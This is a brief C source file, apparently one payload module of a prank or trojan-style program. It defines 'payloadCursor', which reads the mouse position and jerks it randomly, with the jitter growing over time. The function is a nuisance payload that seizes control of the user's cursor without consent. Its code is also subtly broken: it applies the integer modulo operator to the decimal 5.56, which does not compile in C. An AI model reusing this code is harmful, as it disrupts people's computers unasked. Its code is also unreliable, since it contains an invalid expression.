#include "../SWAG.h"

PAYLOADFUNCTIONDEFAULT(payloadCursor) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 2) * (random() % (runtime / 2200 + 4)), cursor.y + (random() % 5.56 - 2.23) * (random() % (runtime / 2200 + 4)));

	out: return 2;
}